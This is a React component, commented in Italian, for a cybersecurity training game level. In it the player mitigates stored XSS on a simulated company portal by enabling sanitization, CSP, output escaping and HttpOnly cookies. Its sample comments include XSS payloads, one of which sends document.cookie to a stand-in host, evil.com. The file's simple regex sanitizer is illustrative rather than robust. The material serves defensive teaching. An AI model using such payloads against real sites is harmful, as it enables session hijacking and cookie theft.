import React, { useState, useEffect } from 'react';
import LevelTemplate, { useLevel } from '../components/LevelTemplate';
import { useReputation } from '../components/ReputationStars';
import InfoPanel from '../components/InfoPanel';
import MissionDebrief from '../components/MissionDebrief';
import Timer from '../components/Timer';

// Componente interno per monitorare la salute e gestire il game over
const HealthMonitor = ({ completed, onGameOver, healthSetterRef }) => {
    const { health, setHealth } = useLevel();
    
    // Assegna setHealth al ref
    React.useEffect(() => {
        if (healthSetterRef) {
            healthSetterRef.current = setHealth;
        }
    }, [setHealth, healthSetterRef]);
    
    useEffect(() => {
        if (health <= 0 && !completed) {
            onGameOver();
        }
    }, [health, completed, onGameOver]);
    
    return null;
};

/**
 * LEVEL 4: XSS (CROSS-SITE SCRIPTING) DEFENSE
 * 
 * Scenario educativo:
 * - Il giocatore è un web security analyst dell'azienda
 * - Il portale dipendenti aziendale ha vulnerabilità XSS
 * - Un attaccante esterno sta iniettando script malevoli negli annunci
 * - Il giocatore deve riconoscere l'attacco e proteggere il sistema aziendale
 * 
 * Obiettivi didattici:
 * - Comprendere cos'è un attacco XSS (Reflected, Stored, DOM-based)
 * - Riconoscere payload XSS nei log (<script>, onerror, ecc.)
 * - Imparare tecniche di mitigazione (sanitization, CSP, escaping)
 * - Distinguere tra contenuto sicuro e script malevoli
 * 
 * Sistema stelle (NON obbligatorio):
 * ⭐ 1 stella: Completare il livello (mitigazione base)
 * ⭐ 2 stelle: Mitigare senza bloccare contenuti legittimi
 * ⭐ 3 stelle: Analisi completa + protezioni multiple (CSP + sanitization)
 */

// Commenti simulati (alcuni con XSS)
const INITIAL_COMMENTS = [
    {
        id: 1,
        user: 'john.doe',
        time: '16:30:12',
        text: 'Great article! Thanks for sharing.',
        safe: true
    },
    {
        id: 2,
        user: 'alice.smith',
        time: '16:32:45',
        text: 'Very informative post, looking forward to more content.',
        safe: true
    },
    {
        id: 3,
        user: 'attacker',
        time: '16:35:18',
        text: '<script>alert("XSS Attack!")</script>This is a test comment',
        safe: false,
        xssType: 'STORED_XSS'
    },
    {
        id: 4,
        user: 'bob.johnson',
        time: '16:38:50',
        text: 'I have a question about the implementation details.',
        safe: true
    },
    {
        id: 5,
        user: 'malicious_user',
        time: '16:40:22',
        text: '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">',
        safe: false,
        xssType: 'STORED_XSS'
    },
    {
        id: 6,
        user: 'eve.hacker',
        time: '16:42:15',
        text: '<iframe src="javascript:alert(\'XSS\')">',
        safe: false,
        xssType: 'STORED_XSS'
    }
];

// Log SIEM che mostrano l'attacco XSS
const generateXSSLogs = (attackActive, sanitizationEnabled) => [
    {
        id: 1,
        time: '16:30:15',
        severity: 'low',
        source: '192.168.1.100',
        type: 'INFO',
        message: 'User john.doe posted comment - Content sanitized: false',
        threat: false
    },
    {
        id: 2,
        time: '16:35:20',
        severity: attackActive ? 'critical' : 'medium',
        source: '203.0.113.66',
        type: attackActive ? 'ALERT' : 'WARNING',
        message: attackActive 
            ? 'XSS payload detected in comment: <script>alert("XSS Attack!")</script>'
            : 'Suspicious input blocked: <script> tag detected and sanitized',
        threat: attackActive
    },
    {
        id: 3,
        time: '16:35:22',
        severity: attackActive ? 'critical' : 'low',
        source: '203.0.113.66',
        type: attackActive ? 'SECURITY' : 'INFO',
        message: attackActive
            ? 'CRITICAL: Script execution detected in user browser - Cookie theft attempt'
            : 'Content Security Policy active - Inline scripts blocked',
        threat: attackActive
    },
    {
        id: 4,
        time: '16:38:52',
        severity: 'low',
        source: '192.168.1.105',
        type: 'INFO',
        message: 'Normal user activity - Comment posted successfully',
        threat: false
    },
    {
        id: 5,
        time: '16:40:25',
        severity: attackActive ? 'high' : 'medium',
        source: '198.51.100.88',
        type: attackActive ? 'ALERT' : 'WARNING',
        message: attackActive
            ? 'XSS via onerror attribute: <img src="x" onerror="..."> - Active exploitation'
            : 'HTML sanitization active - Dangerous attributes removed',
        threat: attackActive
    },
    {
        id: 6,
        time: '16:42:18',
        severity: attackActive ? 'critical' : 'low',
        source: '203.0.113.77',
        type: attackActive ? 'ALERT' : 'INFO',
        message: attackActive
            ? 'Iframe injection detected: <iframe src="javascript:alert(\'XSS\')"> - DOM manipulation attempt'
            : 'CSP violation blocked - Iframe sources restricted',
        threat: attackActive
    },
    {
        id: 7,
        time: '16:43:05',
        severity: 'low',
        source: '192.168.1.100',
        type: 'INFO',
        message: 'User session activity - No suspicious behavior detected',
        threat: false
    },
    {
        id: 8,
        time: '16:45:30',
        severity: attackActive ? 'critical' : 'low',
        source: '203.0.113.66',
        type: attackActive ? 'ALERT' : 'INFO',
        message: attackActive
            ? 'Multiple XSS attempts from same IP - Attack pattern confirmed'
            : 'All user inputs sanitized - XSS protection fully active',
        threat: attackActive
    }
];

const Level4 = () => {
    // Sistema di reputazione (stelle)
    const { stars } = useReputation('level4', 0);
    const { earnStar } = useReputation('level4', 0);

    // === STATO DEL LIVELLO ===
    const [attackActive, setAttackActive] = useState(true); // XSS attivo
    const [scriptExecuted, setScriptExecuted] = useState(true); // Script eseguiti nel browser
    const [protectionsEnabled, setProtectionsEnabled] = useState({
        htmlSanitization: false,
        cspEnabled: false,
        outputEscaping: false,
        httpOnlyCookies: false
    });
    const [comments, setComments] = useState(INITIAL_COMMENTS); // Commenti
    const [appRestarted, setAppRestarted] = useState(false);
    const [xssType, setXssType] = useState(''); // Tipo identificato
    const [legitimateBlocked, setLegitimateBlocked] = useState(false);
    
    // UI State
    const [completed, setCompleted] = useState(false);
    const [failed, setFailed] = useState(false);
    const [showHint, setShowHint] = useState(true);
    const [currentStep, setCurrentStep] = useState(0);
    const [startTime] = useState(Date.now());
    
    // Timer State (5 minutes)
    const MAX_TIME = 300;
    const [secondsRemaining, setSecondsRemaining] = useState(MAX_TIME);
    
    // Ref per accedere a setHealth da Level4Content
    const healthSetterRef = React.useRef(null);
    const [completionTime, setCompletionTime] = useState(0);
    const [hintIndex, setHintIndex] = useState(0);
    const [visibleHint, setVisibleHint] = useState(null);
    const [missionSuccess, setMissionSuccess] = useState(true);

    // Reset hint index quando cambia step
    useEffect(() => {
        setHintIndex(0);
    }, [currentStep]);

    // Timer che incrementa hint index ogni 15 secondi per step con hint multipli
    useEffect(() => {
        if (currentStep === 3) {
            const timer = setInterval(() => {
                setHintIndex(prev => prev + 1);
            }, 15000);
            return () => clearInterval(timer);
        }
    }, [currentStep]);

    // Transizione smooth del testo hint
    useEffect(() => {
        const text = getHintText();
        if (text !== visibleHint) {
            setVisibleHint(null);
            const timeout = setTimeout(() => {
                setVisibleHint(text);
            }, 400);
            return () => clearTimeout(timeout);
        }
    }, [currentStep, hintIndex]);
    
    // Timer logic - countdown every second
    useEffect(() => {
        if (completed || failed) return; // Don't count down after completion or failure

        const interval = setInterval(() => {
            setSecondsRemaining(prev => {
                const newVal = prev - 1;
                
                if (newVal <= 0) {
                    if (healthSetterRef.current) {
                        healthSetterRef.current(0); // Game Over
                    }
                    clearInterval(interval);
                    return 0;
                }
                return newVal;
            });
        }, 1000);

        return () => clearInterval(interval);
    }, [completed, failed]);

    // Update health based on remaining time (linear decrease)
    useEffect(() => {
        if (completed || failed) return;
        
        // Calculate health based on remaining time (linear decrease)
        // 300s = 100%, 0s = 0%
        const healthPercentage = Math.floor((secondsRemaining / MAX_TIME) * 100);
        if (healthSetterRef.current) {
            healthSetterRef.current(Math.max(0, healthPercentage));
        }
    }, [secondsRemaining, completed, failed]);

    // === LOGICA DI MITIGAZIONE ===
    useEffect(() => {
        // HTML Sanitization + Output Escaping = protezione forte
        if (protectionsEnabled.htmlSanitization && protectionsEnabled.outputEscaping) {
            setAttackActive(false);
            setScriptExecuted(false);
        }
        // CSP + Sanitization = protezione completa
        else if (protectionsEnabled.cspEnabled && protectionsEnabled.htmlSanitization) {
            setAttackActive(false);
            setScriptExecuted(false);
        }
        // Solo sanitization: riduce rischio ma non elimina
        else if (protectionsEnabled.htmlSanitization) {
            setScriptExecuted(false);
        }
        // Solo CSP: blocca inline scripts ma non basta
        else if (protectionsEnabled.cspEnabled) {
            setScriptExecuted(false);
        }
    }, [protectionsEnabled]);

    // Sanitizza i commenti quando le protezioni sono attive
    useEffect(() => {
        if (protectionsEnabled.htmlSanitization || protectionsEnabled.outputEscaping) {
            setComments(prevComments => 
                prevComments.map(comment => {
                    if (!comment.safe) {
                        return {
                            ...comment,
                            text: comment.text
                                .replace(/<script[^>]*>.*?<\/script>/gi, '[BLOCKED: script tag]')
                                .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '[BLOCKED: iframe]')
                                .replace(/onerror\s*=/gi, '[BLOCKED: onerror]')
                                .replace(/javascript:/gi, '[BLOCKED: javascript:]')
                                .replace(/on\w+\s*=/gi, '[BLOCKED: event handler]'),
                            sanitized: true
                        };
                    }
                    return comment;
                })
            );
        } else {
            // Ripristina commenti originali
            setComments(INITIAL_COMMENTS);
        }
    }, [protectionsEnabled.htmlSanitization, protectionsEnabled.outputEscaping]);

    // === CONDIZIONE DI COMPLETAMENTO ===
    useEffect(() => {
        if (!attackActive && !scriptExecuted && appRestarted && !completed) {
            // Stella 1: completamento base
            if (stars === 0) {
                earnStar();
            }
            
            // Stella 2: nessun falso positivo
            if (!legitimateBlocked && stars === 1) {
                earnStar();
            }
            
            // Stella 3: analisi completa + protezioni multiple
            const multipleProtections = Object.values(protectionsEnabled).filter(Boolean).length >= 2;
            if (multipleProtections && xssType && stars === 2) {
                earnStar();
            }
            
            setCompletionTime(Math.floor((Date.now() - startTime) / 1000));
            setTimeout(() => {
                setCompleted(true);
            }, 2000);
        }
    }, [attackActive, scriptExecuted, appRestarted, completed, legitimateBlocked, protectionsEnabled, xssType, stars, earnStar, startTime]);

    // === CONFIGURAZIONE BROWSER ===
    const browserConfig = {
        availableSites: [
            {
                url: 'http://company-portal.internal/announcements',
                title: 'Employee Portal',
                icon: '💬',
                content: (
                    <div className={`p-6 h-full overflow-y-auto ${attackActive ? 'bg-red-50' : 'bg-green-50'}`}>
                        <div className="max-w-3xl mx-auto">
                            <div className="flex items-center justify-between mb-6">
                                <h1 className="text-2xl font-bold text-gray-800">💬 Company Employee Portal</h1>
                                <div className={`px-3 py-1 rounded-full text-sm font-bold ${
                                    attackActive ? 'bg-red-500 text-white animate-pulse' : 'bg-green-500 text-white'
                                }`}>
                                    {attackActive ? '⚠️ VULNERABLE' : '✅ SECURE'}
                                </div>
                            </div>

                            {/* Security Notice */}
                            <div className={`mb-6 p-4 rounded-lg border-l-4 ${
                                attackActive 
                                    ? 'bg-red-100 border-red-500'
                                    : 'bg-green-100 border-green-500'
                            }`}>
                                {attackActive ? (
                                    <div className="text-red-800">
                                        <p className="font-bold mb-1">⚠️ SECURITY WARNING</p>
                                        <p className="text-sm">XSS vulnerabilities detected! User input is not sanitized.</p>
                                        <p className="text-xs mt-1">Risk: Cookie theft, session hijacking, malicious redirects</p>
                                    </div>
                                ) : (
                                    <div className="text-green-800">
                                        <p className="font-bold mb-1">✅ SECURE MODE</p>
                                        <p className="text-sm">Input sanitization active. Content Security Policy enforced.</p>
                                        <p className="text-xs mt-1">Protection: HTML escaping, CSP headers, HttpOnly cookies</p>
                                    </div>
                                )}
                            </div>

                            {/* Comments */}
                            <div className="space-y-4">
                                {comments.map(comment => (
                                    <div 
                                        key={comment.id}
                                        className={`bg-white rounded-lg shadow p-4 ${
                                            !comment.safe && attackActive ? 'border-2 border-red-400 animate-pulse' : ''
                                        }`}
                                    >
                                        <div className="flex items-center justify-between mb-2">
                                            <div className="flex items-center gap-2">
                                                <div className="w-8 h-8 bg-gradient-to-br from-blue-400 to-blue-600 rounded-full flex items-center justify-center text-white text-sm font-bold">
                                                    {comment.user.charAt(0).toUpperCase()}
                                                </div>
                                                <div>
                                                    <p className="font-semibold text-sm text-gray-800">{comment.user}</p>
                                                    <p className="text-xs text-gray-500">{comment.time}</p>
                                                </div>
                                            </div>
                                            {!comment.safe && (
                                                <span className={`text-xs px-2 py-1 rounded ${
                                                    attackActive ? 'bg-red-500 text-white' : 'bg-yellow-500 text-white'
                                                }`}>
                                                    {attackActive ? '🚨 XSS' : '🛡️ BLOCKED'}
                                                </span>
                                            )}
                                        </div>
                                        <div className="text-sm text-gray-700">
                                            {attackActive && !comment.safe ? (
                                                // Mostra il payload XSS come testo (pericoloso)
                                                <div className="font-mono text-red-600 bg-red-50 p-2 rounded break-all">
                                                    {comment.text}
                                                </div>
                                            ) : comment.sanitized ? (
                                                // Mostra versione sanitizzata
                                                <div className="text-gray-800">{comment.text}</div>
                                            ) : (
                                                // Commento normale
                                                <div className="text-gray-800">{comment.text}</div>
                                            )}
                                        </div>
                                        {!comment.safe && attackActive && (
                                            <div className="mt-2 text-xs text-red-600 font-mono bg-red-50 p-2 rounded">
                                                ⚠️ This script would execute in a real browser!
                                            </div>
                                        )}
                                    </div>
                                ))}
                            </div>

                            {/* Comment Form */}
                            <div className="mt-6 bg-white rounded-lg shadow p-4">
                                <h3 className="font-semibold mb-2 text-gray-800">Add Comment</h3>
                                <textarea 
                                    className="w-full border border-gray-300 rounded px-3 py-2 text-sm"
                                    rows={3}
                                    placeholder="Share your thoughts..."
                                    disabled
                                />
                                <button 
                                    className="mt-2 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 text-sm"
                                    disabled
                                >
                                    Post Comment
                                </button>
                            </div>
                        </div>
                    </div>
                )
            },
            {
                url: 'http://company-portal.internal/security',
                title: 'Security Dashboard',
                icon: '🔒',
                content: (
                    <div className="p-6 bg-gray-900 text-white h-full overflow-y-auto">
                        <div className="max-w-3xl mx-auto">
                            <h1 className="text-2xl font-bold mb-6">🔒 Web Security Dashboard</h1>

                            {/* Protection Status */}
                            <div className="bg-gray-800 rounded-lg p-4 mb-4">
                                <h2 className="font-semibold mb-3 flex items-center gap-2">
                                    <span>🛡️</span> Active Protections
                                </h2>
                                <div className="space-y-2">
                                    <div className="flex items-center justify-between py-2 border-b border-gray-700">
                                        <span className="text-sm">HTML Sanitization</span>
                                        <span className={`text-sm font-bold ${
                                            protectionsEnabled.htmlSanitization ? 'text-green-400' : 'text-red-400'
                                        }`}>
                                            {protectionsEnabled.htmlSanitization ? '✅ ENABLED' : '❌ DISABLED'}
                                        </span>
                                    </div>
                                    <div className="flex items-center justify-between py-2 border-b border-gray-700">
                                        <span className="text-sm">Content Security Policy (CSP)</span>
                                        <span className={`text-sm font-bold ${
                                            protectionsEnabled.cspEnabled ? 'text-green-400' : 'text-red-400'
                                        }`}>
                                            {protectionsEnabled.cspEnabled ? '✅ ENABLED' : '❌ DISABLED'}
                                        </span>
                                    </div>
                                    <div className="flex items-center justify-between py-2 border-b border-gray-700">
                                        <span className="text-sm">Output Escaping</span>
                                        <span className={`text-sm font-bold ${
                                            protectionsEnabled.outputEscaping ? 'text-green-400' : 'text-red-400'
                                        }`}>
                                            {protectionsEnabled.outputEscaping ? '✅ ENABLED' : '❌ DISABLED'}
                                        </span>
                                    </div>
                                    <div className="flex items-center justify-between py-2">
                                        <span className="text-sm">HttpOnly Cookies</span>
                                        <span className={`text-sm font-bold ${
                                            protectionsEnabled.httpOnlyCookies ? 'text-green-400' : 'text-red-400'
                                        }`}>
                                            {protectionsEnabled.httpOnlyCookies ? '✅ ENABLED' : '❌ DISABLED'}
                                        </span>
                                    </div>
                                </div>
                            </div>

                            {/* XSS Risk Analysis */}
                            <div className="bg-gray-800 rounded-lg p-4 mb-4">
                                <h2 className="font-semibold mb-3 flex items-center gap-2">
                                    <span>📊</span> XSS Risk Analysis
                                </h2>
                                <div className="space-y-3">
                                    <div>
                                        <div className="flex justify-between text-sm mb-1">
                                            <span>Overall Risk Level</span>
                                            <span className={`font-bold ${
                                                attackActive ? 'text-red-400' : 'text-green-400'
                                            }`}>
                                                {attackActive ? 'CRITICAL' : 'LOW'}
                                            </span>
                                        </div>
                                        <div className="w-full bg-gray-700 rounded-full h-2">
                                            <div 
                                                className={`h-2 rounded-full transition-all ${
                                                    attackActive ? 'bg-red-500 w-full' : 'bg-green-500 w-1/4'
                                                }`}
                                            />
                                        </div>
                                    </div>
                                    <div className="text-xs text-gray-400">
                                        <p className="mb-1">
                                            <strong>Detected XSS Payloads:</strong> {
                                                attackActive 
                                                    ? INITIAL_COMMENTS.filter(c => !c.safe).length
                                                    : 0
                                            }
                                        </p>
                                        <p className="mb-1">
                                            <strong>Script Execution:</strong> {scriptExecuted ? 'ACTIVE ⚠️' : 'BLOCKED ✅'}
                                        </p>
                                        <p>
                                            <strong>User Data at Risk:</strong> {attackActive ? 'YES (Cookies, Sessions)' : 'NO'}
                                        </p>
                                    </div>
                                </div>
                            </div>

                            {/* CSP Policy Details */}
                            {protectionsEnabled.cspEnabled && (
                                <div className="bg-gray-800 rounded-lg p-4">
                                    <h2 className="font-semibold mb-3 flex items-center gap-2">
                                        <span>📋</span> Content Security Policy
                                    </h2>
                                    <div className="font-mono text-xs text-green-400 bg-gray-900 p-3 rounded">
                                        <p>Content-Security-Policy:</p>
                                        <p className="ml-2">default-src &apos;self&apos;;</p>
                                        <p className="ml-2">script-src &apos;self&apos;;</p>
                                        <p className="ml-2">style-src &apos;self&apos; &apos;unsafe-inline&apos;;</p>
                                        <p className="ml-2">img-src &apos;self&apos; data: https:;</p>
                                        <p className="ml-2">frame-src &apos;none&apos;;</p>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                )
            }
        ]
    };

    // === CONFIGURAZIONE TERMINAL ===
    const terminalConfig = {
        initialHistory: [
            '$ Web Security Terminal v4.0',
            '$ Type "help" for available commands',
            '$ ⚠️  WARNING: XSS vulnerabilities detected in company employee portal!',
        ],
        commands: {
            'analyze-comments': () => {
                const unsafeComments = comments.filter(c => !c.safe);
                return `=== COMMENT ANALYSIS ===
Total comments: ${comments.length}
Safe comments: ${comments.filter(c => c.safe).length}
Suspicious comments: ${unsafeComments.length}

Detected XSS patterns:
${unsafeComments.map((c, i) => `${i + 1}. User: ${c.user} - Type: ${c.xssType || 'UNKNOWN'}`).join('\n')}

⚠️ Action required: Enable input sanitization!`;
            },

            'show-payload': (args) => {
                const id = parseInt(args[0]);
                const comment = comments.find(c => c.id === id);
                
                if (!comment) {
                    return 'Usage: show-payload <comment_id>\nExample: show-payload 3';
                }
                
                if (comment.safe) {
                    return `Comment ${id} is safe - no XSS detected`;
                }
                
                return `=== XSS PAYLOAD ANALYSIS ===
Comment ID: ${id}
User: ${comment.user}
Payload: ${comment.text}

Attack Vector:
${comment.text.includes('<script>') ? '→ <script> tag injection (Classic XSS)' : ''}
${comment.text.includes('onerror') ? '→ Event handler injection (onerror attribute)' : ''}
${comment.text.includes('<iframe>') ? '→ Iframe injection (DOM manipulation)' : ''}

Risk: ${attackActive ? 'CRITICAL - Script can execute!' : 'MITIGATED - Payload blocked'}`;
            },

            'identify-xss': () => {
                setXssType('STORED_XSS');
                setCurrentStep(1);
                return `=== XSS TYPE IDENTIFICATION ===
Type: STORED XSS (Persistent XSS)
Description: Malicious scripts stored in database
Location: User comments in forum
Impact: Affects all users viewing the page

Attack Flow:
1. Attacker posts comment with <script> tag
2. Script stored in database
3. Script executes for every user viewing comments

✓ XSS type identified successfully!`;
            },

            'enable-sanitization': () => {
                if (protectionsEnabled.htmlSanitization) {
                    return '[!] HTML sanitization is already enabled';
                }
                setProtectionsEnabled(prev => ({ ...prev, htmlSanitization: true }));
                setCurrentStep(2);
                return `[✓] HTML sanitization enabled
[+] Dangerous tags removed: <script>, <iframe>, <object>
[+] Event handlers stripped: onclick, onerror, onload
[+] XSS risk: SIGNIFICANTLY REDUCED`;
            },

            'enable-csp': () => {
                if (protectionsEnabled.cspEnabled) {
                    return '[!] CSP is already enabled';
                }
                setProtectionsEnabled(prev => ({ ...prev, cspEnabled: true }));
                return `[✓] Content Security Policy (CSP) enabled
[+] Inline scripts blocked
[+] Unsafe-eval disabled
[+] Frame-ancestors restricted
[+] XSS risk: REDUCED`;
            },

            'enable-escaping': () => {
                if (protectionsEnabled.outputEscaping) {
                    return '[!] Output escaping is already enabled';
                }
                setProtectionsEnabled(prev => ({ ...prev, outputEscaping: true }));
                return `[✓] Output escaping enabled
[+] HTML entities escaped: < becomes &lt;, > becomes &gt;
[+] Prevents script execution in rendered content
[+] XSS risk: ELIMINATED for escaped content`;
            },

            'enable-httponly': () => {
                if (protectionsEnabled.httpOnlyCookies) {
                    return '[!] HttpOnly cookies are already enabled';
                }
                setProtectionsEnabled(prev => ({ ...prev, httpOnlyCookies: true }));
                return `[✓] HttpOnly cookies enabled
[+] Cookies inaccessible to JavaScript
[+] Prevents cookie theft via XSS
[+] Session hijacking risk: REDUCED`;
            },

            'restart-app': () => {
                if (!protectionsEnabled.htmlSanitization && !protectionsEnabled.outputEscaping) {
                    return '[!] No security changes detected. Apply mitigations first.';
                }
                setAppRestarted(true);
                return `[✓] Application restarted
[✓] New security configurations applied
[✓] XSS protection status: ${!attackActive ? 'ACTIVE' : 'PARTIAL'}
${!attackActive ? '[✓] XSS attack mitigated successfully!' : '[!] Additional protections recommended'}`;
            },

            'scan-vulnerabilities': () => {
                const vulns = [];
                if (!protectionsEnabled.htmlSanitization) vulns.push('- No input sanitization');
                if (!protectionsEnabled.cspEnabled) vulns.push('- Missing Content Security Policy');
                if (!protectionsEnabled.outputEscaping) vulns.push('- No output escaping');
                if (!protectionsEnabled.httpOnlyCookies) vulns.push('- Cookies accessible to scripts');
                
                return `=== VULNERABILITY SCAN ===
${vulns.length > 0 ? 'VULNERABILITIES FOUND:\n' + vulns.join('\n') : '✓ No critical vulnerabilities detected'}

Recommendations:
1. Enable HTML sanitization (CRITICAL)
2. Implement Content Security Policy (HIGH)
3. Enable output escaping (HIGH)
4. Set HttpOnly flag on cookies (MEDIUM)`;
            },

            'status': () => {
                return `=== SECURITY STATUS ===
XSS Attack Active: ${attackActive ? '🔴 YES' : '🟢 NO'}
Script Execution: ${scriptExecuted ? '🔴 ACTIVE' : '🟢 BLOCKED'}
App Status: ${appRestarted ? 'RESTARTED' : 'RUNNING'}
XSS Type Identified: ${xssType || 'NOT YET'}

Active Protections:
- HTML Sanitization: ${protectionsEnabled.htmlSanitization ? '✓' : '✗'}
- CSP: ${protectionsEnabled.cspEnabled ? '✓' : '✗'}
- Output Escaping: ${protectionsEnabled.outputEscaping ? '✓' : '✗'}
- HttpOnly Cookies: ${protectionsEnabled.httpOnlyCookies ? '✓' : '✗'}`;
            }
        },
        prompt: 'websec@xss-defense:~$',
        helpCommand: true
    };

    // === CONFIGURAZIONE SIEM ===
    const siemConfig = {
        logs: generateXSSLogs(attackActive, protectionsEnabled.htmlSanitization),
        blockedIPs: 0,
        currentStep: currentStep,
        trafficHistory: [
            { time: '16:28', value: 20 },
            { time: '16:30', value: 25 },
            { time: '16:35', value: attackActive ? 45 : 30 },
            { time: '16:40', value: attackActive ? 55 : 28 },
            { time: '16:42', value: attackActive ? 60 : 25 },
            { time: '16:45', value: attackActive ? 65 : 22 }
        ],
        networkTraffic: { 
            incoming: attackActive ? 380 : 220, 
            outgoing: attackActive ? 520 : 280 
        },
        protocols: { 
            http: attackActive ? 650 : 350,
            https: 200, 
            ssh: 30, 
            ftp: 0 
        },
        selectedLog: null,
        onLogClick: (log) => console.log('Log analizzato:', log)
    };

    // === HINT PROGRESSIVI ===
    const getHintText = () => {
        if (completed) return '';
        
        switch(currentStep) {
            case 0:
                return 'Analizza i commenti nel BROWSER. Vedi tag <script> o attributi strani? Nel TERMINALE usa "analyze-comments" per analizzare il payload XSS.';
            case 1:
                return 'Hai identificato XSS Stored! Nel TERMINALE usa "enable-sanitization" per bloccare i tag e gli attributi pericolosi come <script> e onerror.';
            case 2:
                return 'Nel TERMINALE attiva "enable-csp" per aggiungere protezione extra, poi usa "restart-app" per riavviare l\'applicazione con le nuove protezioni.';
            case 3: {
                const hints = [
                    '✅ Bene! Le protezioni sono attive. Nel TERMINALE usa "status" per verificare che sia sanitization che CSP siano abilitate, poi controlla il forum nel BROWSER.',
                    'Verifica con il comando "status" che sanitization e CSP siano entrambe abilitate. Analizza di nuovo i commenti per confermare che gli XSS sono bloccati.',
                    'Stai per completare il livello! Nel TERMINALE usa "analyze-comments" per assicurati che tutti gli script XSS siano bloccati dalle protezioni.'
                ];
                return hints[Math.min(hintIndex, hints.length - 1)];
            }
            default:
                return '✅ Nel TERMINALE controlla lo stato con "status" e verifica il forum nel BROWSER per assicurarti che gli XSS siano bloccati!';
        }
    };

    // === STATISTICHE FINALI ===
    const additionalStats = [
        {
            label: 'Protezioni attivate',
            value: Object.values(protectionsEnabled).filter(Boolean).length,
            color: Object.values(protectionsEnabled).filter(Boolean).length >= 2 ? 'text-cyber-green' : 'text-yellow-400'
        },
        {
            label: 'Script execution',
            value: scriptExecuted ? 'ACTIVE' : 'BLOCKED',
            color: !scriptExecuted ? 'text-cyber-green' : 'text-red-500'
        },
        {
            label: 'Tipo XSS identificato',
            value: xssType || 'Non identificato',
            color: xssType ? 'text-cyber-green' : 'text-yellow-400'
        }
    ];

    return (
        <div>
            <LevelTemplate 
                stars={stars}
                hint={showHint && visibleHint ? <InfoPanel text={visibleHint} /> : null}
                browserConfig={browserConfig}
                terminalConfig={terminalConfig}
                siemConfig={siemConfig}
            >                
                <HealthMonitor 
                    completed={completed} 
                    healthSetterRef={healthSetterRef}
                    onGameOver={() => {
                        setMissionSuccess(false);
                        setFailed(true);
                        setCompleted(true);
                    }} 
                />
                {/* TIMER */}
                <div className="absolute top-[22%] left-[16.5%] z-[100] pointer-events-none transform scale-90">
                    <Timer secondsRemaining={secondsRemaining} />
                </div>
                
                {completed && (
                    <MissionDebrief
                        success={missionSuccess}
                        stats={{ stars, health: 100 }}
                        recapText={missionSuccess ? 
                            `XSS DEFENSE ANALYSIS\n\n` +
                            `Protezioni attivate: ${Object.values(protectionsEnabled).filter(Boolean).length}/4\n` +
                            `Script execution: ${scriptExecuted ? 'VULNERABLE' : 'BLOCKED'}\n` +
                            `XSS Type identified: ${xssType || 'N/A'}\n` +
                            `Tempo completamento: ${completionTime}s\n\n` +
                            `${!attackActive && !scriptExecuted ? 'RISULTATO: Vulnerabilità XSS mitigata con successo!' : 'RISULTATO: Completato.'}`
                            : 'XSS vulnerabilities not fully mitigated. System still vulnerable to script injection attacks.\n\nTry again with stronger protections: enable both sanitization AND CSP.'}
                        onRetry={() => window.location.reload()}
                        onExit={() => window.location.href = '/'}
                    />
                )}
            </LevelTemplate>
        </div>
    );
};

export default Level4;
